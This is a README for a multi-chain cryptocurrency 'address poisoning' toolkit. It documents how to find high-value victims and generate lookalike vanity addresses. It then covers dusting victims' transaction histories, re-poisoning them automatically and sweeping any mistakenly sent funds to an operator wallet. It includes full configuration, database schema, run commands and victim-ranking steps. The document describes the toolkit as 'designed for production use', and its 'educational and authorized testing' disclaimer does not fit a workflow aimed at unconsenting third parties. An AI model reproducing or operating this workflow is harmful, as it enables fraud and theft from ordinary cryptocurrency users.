# Address Poisoning Toolkit

⚠️ **WARNING**: This tool is for educational and authorized security testing purposes only. Unauthorized use to deceive, defraud, or harm others is illegal and unethical. You must obtain explicit written permission from the owner of any wallet before using this software. The authors assume no liability for misuse.

---

## Overview

This toolkit automates the creation and operation of an **address poisoning** attack on **multiple EVM‑compatible blockchains** (Ethereum, BSC, Polygon, and more). It:

- Scans blockchain for high‑value victims with frequent transaction partners.
- Generates **vanity addresses** (trap addresses) that visually resemble trusted counterparties.
- Funds those trap addresses with a small amount of native currency (ETH/BNB/MATIC) or stablecoins (USDC/USDT).
- Sends a tiny “dust” transaction from the trap address to the victim, poisoning their wallet history.
- Monitors trap addresses for accidental incoming funds from the victim and sweeps them to a safe wallet.
- Automatically re‑poisons victims when they make new transactions.

The system is designed for **production use** with robust logging, retries, Telegram alerts, encrypted storage of private keys, and **full multi‑chain support** (switch chains with a single environment variable).

---

## Architecture

The system consists of several scripts working together:

| Script | Purpose |
|--------|---------|
| `collector.js` | Ingest high‑value token transfers into PostgreSQL. |
| `clusterer.js` | Identify frequent transaction pairs (victim ↔ trusted counterparty). |
| `observer.js` | Watch the mempool for active victims and record them. |
| `batch_generate.py` | Generate vanity trap addresses on a remote Clore.ai GPU. |
| `batch_fund.py` | Send small amounts (native currency / USDC/USDT) from your source wallet to all trap addresses. |
| `duster.py` | Send a dust transaction from each trap address to its victim. |
| `sweeper.js` | Monitor all trap addresses and sweep any incoming native or ERC‑20 tokens to a safe wallet. |
| `re_poison.js` | Watch for new transactions from victims and re‑poison them. |
| `rank_victims.py` | Rank victims by activity (frequency, total value, recency). |

All scripts use a central `config`, rotating file logger, retry logic, and optional Telegram alerts. **Multi‑chain support** is built into every script via the `CHAIN` environment variable.

---

## Prerequisites

- **Node.js** (v18 or higher)
- **Python** (3.9 or higher)
- **PostgreSQL** (v13 or higher)
- **RPC provider** (Alchemy, Infura, or public endpoints) for each chain you intend to use.
- **Clore.ai account** (for GPU rental) – optional for batch generation.
- **Telegram bot token** (optional for alerts).

Install system dependencies:

```bash
# macOS
brew install postgresql@14
brew install sshpass

# Ubuntu/Debian
sudo apt update && sudo apt install postgresql-14 sshpass

# Enable PostgreSQL and create database
createdb address_poisoning

Installation
bash

# Clone repository
git clone <your-repo-url>
cd address-poisoning

# Install Node dependencies
npm install

# Install Python dependencies
pip install -r requirements.txt

requirements.txt should include:
text

web3==6.19.0
psycopg2-binary
python-dotenv
cryptography
requests
tenacity

Configuration

Copy .env.example to .env and fill in all required values.
Multi‑chain setup

Set CHAIN to one of: ethereum, bsc, or polygon. All scripts will automatically use the corresponding RPC, token addresses, and native currency.
env

# --- Active chain ---
CHAIN=ethereum   # or bsc, polygon

# --- RPC endpoints (chain‑specific) ---
ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your_key
BSC_RPC_URL=https://bsc-dataseed.binance.org/
POLYGON_RPC_URL=https://polygon-rpc.com/

# Legacy fallback RPC (used if chain‑specific is not set)
NODE_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your_key
OBSERVER_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your_key
SWEEPER_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your_key
DUSTER_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your_key
FALLBACK_RPC_URLS=https://rpc.ankr.com/eth,https://eth-mainnet.g.alchemy.com/v2/backup_key

# --- PostgreSQL ---
DB_USER=your_db_user
DB_HOST=localhost
DB_NAME=address_poisoning
DB_PASSWORD=your_password
DB_PORT=5432

# --- Clore.ai (optional) ---
CLORE_API_KEY=your_clore_api_key
CLORE_INSTANCE_ID=your_active_order_id
BATCH_REMOTE_USER=root
BATCH_REMOTE_HOST=n1.msk.cloreai.ru
BATCH_REMOTE_PORT=your_port
BATCH_REMOTE_PASSWORD=your_password
BATCH_REMOTE_PATH=~/profanity

# --- Funding source wallet ---
SOURCE_PRIVATE_KEY=0x...   # wallet that holds native currency / USDC/USDT for funding
FUNDING_AMOUNT_ETH=0.0005  # amount per trap address (native currency)
FUNDING_GAS_PRICE_GWEI=30  # fallback; dynamic gas used

# --- Dust amounts (smallest unit) ---
# For native currencies (ETH/BNB/MATIC)
DUST_ETH_WEI=100000000000000      # 0.0001 ETH (also used for BNB/MATIC if not overridden)
DUST_BNB_WEI=100000000000000      # 0.0001 BNB
DUST_MATIC_WEI=100000000000000    # 0.0001 MATIC
# For stablecoins (same for all chains)
DUST_USDC_UNITS=1000              # 0.001 USDC
DUST_USDT_UNITS=1000              # 0.001 USDT

# --- Native token threshold (for collector, ~$1000 USD) ---
ETH_NATIVE_THRESHOLD_WEI=600000000000000000  # 0.6 ETH
BSC_NATIVE_THRESHOLD_WEI=600000000000000000 # 0.6 BNB
POLYGON_NATIVE_THRESHOLD_WEI=600000000000000000 # 0.6 MATIC

# --- Gas settings (EIP-1559) ---
GAS_MAX_FEE_CAP_GWEI=200
GAS_PRIORITY_FEE_GWEI=2
GAS_FEE_BUFFER=1.25

# --- Files ---
VAULT_FILE=vault.txt
QUALIFIED_FILE=qualified_targets.txt
PENDING_FILE=pending_targets.txt
PROGRESS_FILE=batch_progress.txt
RANKED_ADDRESSES_FILE=ranked_addresses.txt
RANKED_DETAILS_FILE=ranked_victims.txt

# --- Encryption (optional but recommended) ---
VAULT_ENCRYPTION_PASSWORD=your_strong_password

# --- Telegram alerts ---
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id

# --- Sweeper ---
SAFE_WALLET_ADDRESS=0xYourSafeWallet
SWEEPER_POLL_INTERVAL_MS=5000
MIN_ETH_SWEEP_WEI=1000000000000000   # 0.001 native currency

# --- Re-poison ---
REPOISON_COOLDOWN_MS=3600000
REPOISON_DUST_RETRIES=2
REPOISON_DELAY_MS=2000

# --- Logging ---
LOG_LEVEL=info
LOG_DIR=./logs

Database Setup

Run the following SQL to create the token_transfers table:
sql

CREATE TABLE token_transfers (
    transaction_hash TEXT PRIMARY KEY,
    block_number BIGINT NOT NULL,
    token_address TEXT NOT NULL,
    sender TEXT NOT NULL,
    receiver TEXT NOT NULL,
    value TEXT NOT NULL
);

CREATE INDEX idx_sender ON token_transfers(sender);
CREATE INDEX idx_receiver ON token_transfers(receiver);
CREATE INDEX idx_block ON token_transfers(block_number);

Step‑by‑Step Operation
1. Collector (Data Ingestion)

Start the collector to ingest high‑value transfers for the selected chain:
bash

node src/collector.js

It will poll every 4 seconds and save transfers ≥ $1,000 USD equivalent to the database.
2. Clusterer (Identify Targets)

Run the clusterer to see frequent transaction pairs:
bash

node src/clusterer.js

It will output a table of victims, their trusted counterparties, frequency, and max transfer value.
3. Observer (Mempool Monitoring)

Start the observer to watch for active victims and record them:
bash

node src/observer.js

This appends new victim‑counterparty pairs to pending_targets.txt and maintains qualified_targets.txt (pairs that meet frequency ≥ 7 and recency ≤ 30 days). You can run this continuously to accumulate targets.
4. Generate Vanity Addresses (Batch)

Once you have a list of counterparties in qualified_targets.txt, generate trap addresses using a rented GPU:
bash

python3 src/batch_generate.py

This will:

    Connect to your Clore.ai GPU (or any remote server with profanity installed).

    For each counterparty, generate a private key whose address matches the first 4 and last 4 characters.

    Save the result in vault.txt in the format:
    text

    [timestamp] Chain: <chain> | Victim: 0x... | Counterparty: 0x... | Key: 0x...

    The script is resume‑safe: if interrupted, it will continue from the last saved index using batch_progress.txt.

5. Fund Trap Addresses

Before poisoning, you must fund the trap addresses with a small amount of native currency (ETH/BNB/MATIC) or USDC/USDT.
bash

python3 batch_fund.py

It will:

    Read vault.txt to get all trap addresses (Counterparty).

    Check your source wallet’s balances (USDC, USDT, native).

    Send the chosen asset (priority USDC > USDT > native) to each trap address.

    Prompt for confirmation before starting.

6. Poison Victims (Send Dust)

Now send a tiny dust transaction from each trap address to its victim:
bash

python3 tools/duster.py

It will:

    Decrypt vault.txt and extract each victim + corresponding private key.

    For each, check if the victim holds USDC/USDT; if so, and if the trap address holds enough of that token, send a token dust.

    Otherwise, send native currency dust.

    Handle insufficient balances gracefully and send Telegram alerts when funds are low.

You can also test a single victim:
bash

python3 tools/duster.py <private_key> <victim_address>

7. Sweep Incoming Funds

Run the sweeper to monitor all trap addresses and sweep any native balance to your safe wallet:
bash

node src/sweeper.js

It will:

    Read vault.txt to get all private keys.

    Poll every SWEEPER_POLL_INTERVAL_MS (default 5s) for native balance.

    If balance exceeds gas cost, sweep it to SAFE_WALLET_ADDRESS.

    Also checks and sweeps a list of major ERC‑20 tokens (USDC, USDT, WBTC, WETH, etc.) for the selected chain.

For a single address:
bash

node src/sweeper.js <private_key> <destination_address>

8. Automatic Re‑Poisoning

Once the observer and sweeper are running, you can also run the re‑poisoner:
bash

node src/re_poison.js

It will:

    Watch the mempool for pending transactions from any victim in vault.txt.

    When a victim sends a transaction (after a cooldown), send two dust transactions again.

    Respects REPOISON_COOLDOWN_MS (default 1 hour) to avoid spamming.

9. Rank Victims (Optional)

To prioritise your most valuable victims, run:
bash

python3 rank_victims.py

This queries the database and produces:

    ranked_victims_<chain>.txt – detailed TSV with frequency, total amount, last block.

    ranked_addresses_<chain>.txt – just the victim addresses, in ranked order.

Output filenames include the chain suffix (except for ethereum).
Vault Encryption

All private keys are stored in vault.txt encrypted with AES‑256‑GCM. You must set VAULT_ENCRYPTION_PASSWORD in your .env file.

To encrypt an existing plain‑text vault, run:
bash

python3 migrate_vault_encryption.py

It creates a backup (vault.txt.backup) and replaces the file with encrypted lines.

All scripts that read vault.txt automatically decrypt on the fly.
Telegram Alerts

If TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set, the system will send notifications for:

    Poison transaction sent (success/failure).

    Sweep executed (funds received).

    Errors (RPC failure, gas estimation, script crash).

    Insufficient funds warnings.

Logging

All scripts log to both console and rotating files in ./logs/. The log level is controlled by LOG_LEVEL.
Multi‑Chain Switching

To switch chains, simply change the CHAIN environment variable in your .env file and restart the scripts. All scripts will automatically use the correct RPC, token addresses, and native currency. You can run separate instances for different chains concurrently (e.g., by using different databases or adding a chain_id column).
Troubleshooting
No RPC connection

Ensure your RPC URLs are correct and the API keys are valid. Use FALLBACK_RPC_URLS for redundancy.
SSH connection fails (batch_generate.py)

    Verify BATCH_REMOTE_HOST, BATCH_REMOTE_PORT, and password.

    Use ssh -p <port> root@<host> to test connectivity manually.

    Ensure sshpass is installed.

Decryption errors

    Ensure VAULT_ENCRYPTION_PASSWORD is correctly set and matches the password used during migration.

    If you have a plain‑text vault, set the password or run migrate_vault_encryption.py.

Insufficient funds for gas

    Trap addresses must be funded with at least ~0.00015 native currency per dust transaction.

    Run batch_fund.py first.

Sweeper not detecting balances

    The sweeper only checks native currency and a predefined list of ERC‑20 tokens (chain‑specific). Add more tokens by extending the token list in lib/config.js / lib/config.py or modify TOKEN_LIST in sweeper.js.

    Check that the RPC URL used for sweeper (SWEEPER_RPC_URL) is correctly set.

Re‑poisoner not triggering

    Ensure re_poison.js is running and can connect to the mempool.

    Check cooldown: a victim will not be re‑poisoned more than once per hour (configurable).

File Structure
text

.
├── .env                     # Configuration
├── .env.example
├── package.json
├── requirements.txt
├── vault.txt                # Encrypted private keys
├── vault.txt.backup         # Backup before encryption
├── pending_targets.txt      # Real‑time detected victims
├── qualified_targets.txt    # High‑frequency + recent pairs
├── batch_progress.txt       # Resume index for batch_generate
├── ranked_addresses.txt     # Ranked victim addresses (chain‑suffixed for multi‑chain)
├── ranked_victims.txt       # Detailed ranking table (chain‑suffixed)
├── logs/                    # Rotating log files
├── lib/                     # Shared modules (Node & Python)
│   ├── config.js
│   ├── logger.js
│   ├── retry.js
│   ├── notifier.js
│   ├── shutdown.js
│   ├── encryption.js
│   ├── config.py
│   ├── logger.py
│   ├── retry.py
│   ├── notifier.py
│   └── encryption.py
├── src/
│   ├── collector.js
│   ├── clusterer.js
│   ├── observer.js
│   ├── sweeper.js
│   └── re_poison.js
├── tools/
│   ├── bridge.py
│   ├── duster.py
│   └── batch_fund.py
├── batch_generate.py
├── rank_victims.py
├── migrate_vault_encryption.py
└── README.md

License & Disclaimer

This project is provided as‑is for educational and authorized security testing only. The authors are not responsible for any misuse or damages. Use at your own risk.

Happy building – and remember to always act legally and ethically.